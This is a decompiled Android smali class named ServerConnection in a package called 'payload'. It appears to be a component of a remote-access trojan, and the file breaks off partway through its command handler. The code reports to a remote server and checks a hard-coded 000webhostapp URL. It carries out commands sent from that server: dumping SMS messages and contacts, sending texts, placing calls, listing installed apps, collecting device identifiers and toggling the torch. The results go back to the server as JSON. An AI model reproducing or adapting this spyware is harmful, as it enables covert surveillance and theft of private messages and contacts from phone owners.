.class public Lcom/mycompany/payload/ServerConnection;
.super Landroid/os/AsyncTask;
.source "ServerConnection.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field DeviceInfo:Ljava/lang/String;

.field public IS_SERVER_ON:Z

.field SendingData:Ljava/lang/String;

.field c:Landroid/content/Context;

.field contact:Ljava/lang/String;

.field packages:Ljava/lang/String;

.field str:Ljava/lang/StringBuilder;


# direct methods
.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;)V
    .locals 8

    .prologue
    .line 19
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v4, v0

    invoke-direct {v4}, Landroid/os/AsyncTask;-><init>()V

    move-object v4, v0

    const/4 v5, 0x1

    iput-boolean v5, v4, Lcom/mycompany/payload/ServerConnection;->IS_SERVER_ON:Z

    move-object v4, v0

    new-instance v5, Ljava/lang/StringBuilder;

    move-object v7, v5

    move-object v5, v7

    move-object v6, v7

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    iput-object v5, v4, Lcom/mycompany/payload/ServerConnection;->str:Ljava/lang/StringBuilder;

    .line 20
    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    .line 21
    move-object v4, v0

    move-object v5, v2

    iput-object v5, v4, Lcom/mycompany/payload/ServerConnection;->SendingData:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 9

    .prologue
    .line 23
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v3, p3

    move-object v5, v0

    invoke-direct {v5}, Landroid/os/AsyncTask;-><init>()V

    move-object v5, v0

    const/4 v6, 0x1

    iput-boolean v6, v5, Lcom/mycompany/payload/ServerConnection;->IS_SERVER_ON:Z

    move-object v5, v0

    new-instance v6, Ljava/lang/StringBuilder;

    move-object v8, v6

    move-object v6, v8

    move-object v7, v8

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iput-object v6, v5, Lcom/mycompany/payload/ServerConnection;->str:Ljava/lang/StringBuilder;

    .line 24
    move-object v5, v0

    move-object v6, v1

    iput-object v6, v5, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    .line 25
    move-object v5, v0

    move-object v6, v2

    iput-object v6, v5, Lcom/mycompany/payload/ServerConnection;->SendingData:Ljava/lang/String;

    .line 26
    move-object v5, v0

    move-object v6, v3

    iput-object v6, v5, Lcom/mycompany/payload/ServerConnection;->DeviceInfo:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 10

    .prologue
    .line 28
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v3, p3

    move-object v4, p4

    move-object v6, v0

    invoke-direct {v6}, Landroid/os/AsyncTask;-><init>()V

    move-object v6, v0

    const/4 v7, 0x1

    iput-boolean v7, v6, Lcom/mycompany/payload/ServerConnection;->IS_SERVER_ON:Z

    move-object v6, v0

    new-instance v7, Ljava/lang/StringBuilder;

    move-object v9, v7

    move-object v7, v9

    move-object v8, v9

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iput-object v7, v6, Lcom/mycompany/payload/ServerConnection;->str:Ljava/lang/StringBuilder;

    .line 29
    move-object v6, v0

    move-object v7, v1

    iput-object v7, v6, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    .line 30
    move-object v6, v0

    move-object v7, v2

    iput-object v7, v6, Lcom/mycompany/payload/ServerConnection;->SendingData:Ljava/lang/String;

    .line 31
    move-object v6, v0

    move-object v7, v3

    iput-object v7, v6, Lcom/mycompany/payload/ServerConnection;->DeviceInfo:Ljava/lang/String;

    .line 32
    move-object v6, v0

    move-object v7, v4

    iput-object v7, v6, Lcom/mycompany/payload/ServerConnection;->packages:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 11

    .prologue
    .line 34
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v3, p3

    move-object v4, p4

    move-object/from16 v5, p5

    move-object v7, v0

    invoke-direct {v7}, Landroid/os/AsyncTask;-><init>()V

    move-object v7, v0

    const/4 v8, 0x1

    iput-boolean v8, v7, Lcom/mycompany/payload/ServerConnection;->IS_SERVER_ON:Z

    move-object v7, v0

    new-instance v8, Ljava/lang/StringBuilder;

    move-object v10, v8

    move-object v8, v10

    move-object v9, v10

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    iput-object v8, v7, Lcom/mycompany/payload/ServerConnection;->str:Ljava/lang/StringBuilder;

    .line 35
    move-object v7, v0

    move-object v8, v1

    iput-object v8, v7, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    .line 36
    move-object v7, v0

    move-object v8, v2

    iput-object v8, v7, Lcom/mycompany/payload/ServerConnection;->SendingData:Ljava/lang/String;

    .line 37
    move-object v7, v0

    move-object v8, v3

    iput-object v8, v7, Lcom/mycompany/payload/ServerConnection;->DeviceInfo:Ljava/lang/String;

    .line 38
    move-object v7, v0

    move-object v8, v4

    iput-object v8, v7, Lcom/mycompany/payload/ServerConnection;->packages:Ljava/lang/String;

    .line 39
    move-object v7, v0

    move-object v8, v5

    iput-object v8, v7, Lcom/mycompany/payload/ServerConnection;->contact:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public ConnectionStarter()V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 45
    move-object/from16 v0, p0

    :try_start_0
    new-instance v10, Ljava/net/URL;

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    sget-object v12, Lcom/mycompany/payload/MainIpContinor;->IP:Ljava/lang/String;

    invoke-direct {v11, v12}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    move-object v2, v10

    .line 46
    new-instance v10, Lorg/json/JSONObject;

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    invoke-direct {v11}, Lorg/json/JSONObject;-><init>()V

    move-object v3, v10

    .line 49
    move-object v10, v2

    invoke-virtual {v10}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v10

    check-cast v10, Ljava/net/HttpURLConnection;

    move-object v4, v10

    .line 51
    move-object v10, v4

    const-string v11, "POST"

    invoke-virtual {v10, v11}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 53
    move-object v10, v4

    const-string v11, "Content-Type"

    const-string v12, "application/json"

    invoke-virtual {v10, v11, v12}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 55
    move-object v10, v4

    const/4 v11, 0x1

    invoke-virtual {v10, v11}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 57
    new-instance v10, Ljava/io/DataOutputStream;

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    move-object v12, v4

    invoke-virtual {v12}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    move-object v5, v10

    .line 63
    move-object v10, v0

    :try_start_1
    iget-object v10, v10, Lcom/mycompany/payload/ServerConnection;->SendingData:Ljava/lang/String;

    if-eqz v10, :cond_0

    .line 65
    move-object v10, v3

    const-string v11, "data"

    move-object v12, v0

    iget-object v12, v12, Lcom/mycompany/payload/ServerConnection;->SendingData:Ljava/lang/String;

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v10

    .line 79
    :goto_0
    move-object v10, v5

    move-object v11, v3

    :try_start_2
    invoke-virtual {v11}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 80
    move-object v10, v5

    invoke-virtual {v10}, Ljava/io/DataOutputStream;->flush()V

    .line 81
    move-object v10, v5

    invoke-virtual {v10}, Ljava/io/DataOutputStream;->close()V

    .line 83
    move-object v10, v4

    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v10

    move v6, v10

    .line 103
    new-instance v10, Ljava/io/BufferedReader;

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    new-instance v12, Ljava/io/InputStreamReader;

    move-object v15, v12

    move-object v12, v15

    move-object v13, v15

    move-object v14, v4

    invoke-virtual {v14}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v14

    invoke-direct {v13, v14}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v11, v12}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v7, v10

    .line 106
    :goto_1
    move-object v10, v7

    invoke-virtual {v10}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v10

    move-object v15, v10

    move-object v10, v15

    move-object v11, v15

    move-object v8, v11

    if-nez v10, :cond_4

    .line 113
    move-object v10, v4

    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_1

    :goto_2
    return-void

    .line 66
    :cond_0
    move-object v10, v0

    :try_start_3
    iget-object v10, v10, Lcom/mycompany/payload/ServerConnection;->DeviceInfo:Ljava/lang/String;

    if-eqz v10, :cond_1

    .line 67
    move-object v10, v3

    const-string v11, "Info"

    move-object v12, v0

    iget-object v12, v12, Lcom/mycompany/payload/ServerConnection;->DeviceInfo:Ljava/lang/String;

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v10

    goto :goto_0

    .line 68
    :cond_1
    move-object v10, v0

    iget-object v10, v10, Lcom/mycompany/payload/ServerConnection;->packages:Ljava/lang/String;

    if-eqz v10, :cond_2

    .line 69
    move-object v10, v3

    const-string v11, "packages"

    move-object v12, v0

    iget-object v12, v12, Lcom/mycompany/payload/ServerConnection;->packages:Ljava/lang/String;

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v10

    goto :goto_0

    .line 70
    :cond_2
    move-object v10, v0

    iget-object v10, v10, Lcom/mycompany/payload/ServerConnection;->contact:Ljava/lang/String;

    if-eqz v10, :cond_3

    .line 71
    move-object v10, v3

    const-string v11, "contact"

    move-object v12, v0

    iget-object v12, v12, Lcom/mycompany/payload/ServerConnection;->contact:Ljava/lang/String;

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v10

    goto :goto_0

    .line 73
    :cond_3
    move-object v10, v3

    const-string v11, "data"

    const-string v12, "command not found"

    invoke-virtual {v10, v11, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_1

    move-result-object v10

    goto :goto_0

    :catch_0
    move-exception v10

    move-object v6, v10

    goto :goto_0

    .line 108
    :cond_4
    move-object v10, v0

    :try_start_4
    iget-object v10, v10, Lcom/mycompany/payload/ServerConnection;->str:Ljava/lang/StringBuilder;

    move-object v11, v8

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 110
    move-object v10, v7

    invoke-virtual {v10}, Ljava/io/BufferedReader;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_1

    .line 113
    :catch_1
    move-exception v10

    move-object v2, v10

    goto :goto_2
.end method

.method protected bridge doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    move-object v4, v1

    check-cast v4, [Ljava/lang/Void;

    invoke-virtual {v3, v4}, Lcom/mycompany/payload/ServerConnection;->doInBackground([Ljava/lang/Void;)Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    return-object v0
.end method

.method protected doInBackground([Ljava/lang/Void;)Ljava/lang/String;
    .locals 14
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 123
    move-object v0, p0

    move-object v1, p1

    move-object v10, v0

    invoke-virtual {v10}, Lcom/mycompany/payload/ServerConnection;->ConnectionStarter()V

    .line 124
    const/4 v10, 0x0

    check-cast v10, Ljava/lang/String;

    move-object v3, v10

    .line 127
    :try_start_0
    new-instance v10, Ljava/net/URL;

    move-object v13, v10

    move-object v10, v13

    move-object v11, v13

    const-string v12, "https://mrhola.000webhostapp.com/DOP.txt"

    invoke-direct {v11, v12}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    move-object v4, v10

    .line 128
    move-object v10, v4

    invoke-virtual {v10}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v10

    check-cast v10, Ljava/net/HttpURLConnection;

    move-object v5, v10

    .line 130
    move-object v10, v5

    const/4 v11, 0x1

    invoke-virtual {v10, v11}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 131
    move-object v10, v5

    invoke-virtual {v10}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v10

    move v6, v10

    .line 132
    new-instance v10, Ljava/io/InputStreamReader;

    move-object v13, v10

    move-object v10, v13

    move-object v11, v13

    move-object v12, v5

    invoke-virtual {v12}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    move-object v7, v10

    .line 133
    new-instance v10, Ljava/io/BufferedReader;

    move-object v13, v10

    move-object v10, v13

    move-object v11, v13

    move-object v12, v7

    invoke-direct {v11, v12}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v8, v10

    .line 134
    move-object v10, v8

    invoke-virtual {v10}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v10

    move-object v3, v10

    .line 137
    :goto_0
    move-object v10, v3

    const-string v11, "true"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_0

    .line 141
    :goto_1
    move-object v10, v0

    iget-object v10, v10, Lcom/mycompany/payload/ServerConnection;->str:Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    move-object v0, v10

    return-object v0

    .line 134
    :catch_0
    move-exception v10

    move-object v4, v10

    goto :goto_0

    .line 139
    :cond_0
    move-object v10, v0

    const/4 v11, 0x0

    check-cast v11, Ljava/lang/StringBuilder;

    iput-object v11, v10, Lcom/mycompany/payload/ServerConnection;->str:Ljava/lang/StringBuilder;

    goto :goto_1
.end method

.method protected bridge onPostExecute(Ljava/lang/Object;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    move-object v4, v1

    check-cast v4, Ljava/lang/String;

    invoke-virtual {v3, v4}, Lcom/mycompany/payload/ServerConnection;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 148
    move-object v0, p0

    move-object v1, p1

    move-object v7, v1

    const-string v8, "torch on"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 149
    new-instance v7, Lcom/mycompany/payload/CommandRunnder;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    iget-object v9, v9, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    invoke-direct {v8, v9}, Lcom/mycompany/payload/CommandRunnder;-><init>(Landroid/content/Context;)V

    const/4 v8, 0x1

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/CommandRunnder;->Camera(Z)V

    .line 150
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const-string v9, "torch is on"

    invoke-direct {v7, v8, v9}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 229
    :goto_0
    return-void

    .line 154
    :cond_0
    move-object v7, v1

    const-string v8, "torch off"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 155
    new-instance v7, Lcom/mycompany/payload/CommandRunnder;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    iget-object v9, v9, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    invoke-direct {v8, v9}, Lcom/mycompany/payload/CommandRunnder;-><init>(Landroid/content/Context;)V

    const/4 v8, 0x0

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/CommandRunnder;->Camera(Z)V

    .line 157
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const-string v9, "torch is off"

    invoke-direct {v7, v8, v9}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    .line 161
    :cond_1
    move-object v7, v1

    const-string v8, "dump_sms"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 162
    new-instance v7, Lcom/mycompany/payload/CommandRunnder;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    iget-object v9, v9, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    invoke-direct {v8, v9}, Lcom/mycompany/payload/CommandRunnder;-><init>(Landroid/content/Context;)V

    invoke-virtual {v7}, Lcom/mycompany/payload/CommandRunnder;->smsDumper()Ljava/lang/String;

    move-result-object v7

    move-object v3, v7

    .line 163
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    move-object v9, v3

    invoke-direct {v7, v8, v9}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    .line 166
    :cond_2
    move-object v7, v1

    const-string v8, "send_sms"

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_3

    .line 167
    move-object v7, v1

    const-string v8, ","

    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    move-object v3, v7

    .line 168
    move-object v7, v3

    const/4 v8, 0x1

    aget-object v7, v7, v8

    move-object v4, v7

    .line 169
    move-object v7, v3

    const/4 v8, 0x2

    aget-object v7, v7, v8

    move-object v5, v7

    .line 170
    new-instance v7, Lcom/mycompany/payload/CommandRunnder;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    iget-object v9, v9, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    invoke-direct {v8, v9}, Lcom/mycompany/payload/CommandRunnder;-><init>(Landroid/content/Context;)V

    move-object v8, v4

    move-object v9, v5

    invoke-virtual {v7, v8, v9}, Lcom/mycompany/payload/CommandRunnder;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 171
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const-string v9, "message sending done"

    invoke-direct {v7, v8, v9}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    .line 174
    :cond_3
    move-object v7, v1

    const-string v8, "call"

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 175
    move-object v7, v1

    const-string v8, " "

    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    move-object v3, v7

    .line 176
    move-object v7, v3

    const/4 v8, 0x1

    aget-object v7, v7, v8

    move-object v4, v7

    .line 177
    new-instance v7, Lcom/mycompany/payload/CommandRunnder;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    iget-object v9, v9, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    invoke-direct {v8, v9}, Lcom/mycompany/payload/CommandRunnder;-><init>(Landroid/content/Context;)V

    move-object v8, v4

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/CommandRunnder;->makeACall(Ljava/lang/String;)V

    .line 178
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const-string v9, "calling done"

    invoke-direct {v7, v8, v9}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 182
    :cond_4
    move-object v7, v1

    const-string v8, "device_info"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_5

    .line 183
    new-instance v7, Lorg/json/JSONObject;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    invoke-direct {v8}, Lorg/json/JSONObject;-><init>()V

    move-object v3, v7

    .line 186
    move-object v7, v3

    :try_start_0
    const-string v8, "BRAND"

    sget-object v9, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 187
    move-object v7, v3

    const-string v8, "BOARD"

    sget-object v9, Landroid/os/Build;->BOARD:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 188
    move-object v7, v3

    const-string v8, "BOOTLOADER"

    sget-object v9, Landroid/os/Build;->BOOTLOADER:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 189
    move-object v7, v3

    const-string v8, "DEVICE"

    sget-object v9, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 190
    move-object v7, v3

    const-string v8, "DISPLAY"

    sget-object v9, Landroid/os/Build;->DISPLAY:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 191
    move-object v7, v3

    const-string v8, "FINGERPRINT"

    sget-object v9, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 192
    move-object v7, v3

    const-string v8, "HARDWARE"

    sget-object v9, Landroid/os/Build;->HARDWARE:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 193
    move-object v7, v3

    const-string v8, "HOST"

    sget-object v9, Landroid/os/Build;->HOST:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 194
    move-object v7, v3

    const-string v8, "DEVICE ID"

    sget-object v9, Landroid/os/Build;->ID:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 195
    move-object v7, v3

    const-string v8, "MANUFACTURER"

    sget-object v9, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 196
    move-object v7, v3

    const-string v8, "DEVICE MODEL"

    sget-object v9, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 197
    move-object v7, v3

    const-string v8, "PRODUCT"

    sget-object v9, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 198
    move-object v7, v3

    const-string v8, "RADIO"

    sget-object v9, Landroid/os/Build;->RADIO:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 199
    move-object v7, v3

    const-string v8, "SERIAL"

    sget-object v9, Landroid/os/Build;->SERIAL:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 200
    move-object v7, v3

    const-string v8, "USER"

    sget-object v9, Landroid/os/Build;->USER:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 201
    move-object v7, v3

    const-string v8, "ANDROID VERSION"

    sget-object v9, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v7

    .line 202
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const/4 v9, 0x0

    check-cast v9, Ljava/lang/String;

    move-object v10, v3

    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v7, v8, v9, v10}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    goto/16 :goto_0

    :catch_0
    move-exception v7

    move-object v4, v7

    goto :goto_1

    .line 208
    :cond_5
    move-object v7, v1

    const-string v8, "InstalledApps"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_6

    .line 209
    new-instance v7, Lcom/mycompany/payload/CommandRunnder;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v0

    iget-object v9, v9, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    invoke-direct {v8, v9}, Lcom/mycompany/payload/CommandRunnder;-><init>(Landroid/content/Context;)V

    move-object v3, v7

    .line 210
    move-object v7, v3

    invoke-virtual {v7}, Lcom/mycompany/payload/CommandRunnder;->getInstalledPackages()Ljava/lang/String;

    move-result-object v7

    move-object v4, v7

    .line 211
    new-instance v7, Lcom/mycompany/payload/ServerLoopCaller;

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/ServerConnection;->c:Landroid/content/Context;

    const/4 v9, 0x0

    check-cast v9, Ljava/lang/String;

    const/4 v10, 0x0

    check-cast v10, Ljava/lang/String;

    move-object v11, v4

    invoke-direct {v7, v8, v9, v10, v11}, Lcom/mycompany/payload/ServerLoopCaller;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 214
    :cond_6
    move-object v7, v1

    const-string v8, "dump_contact"

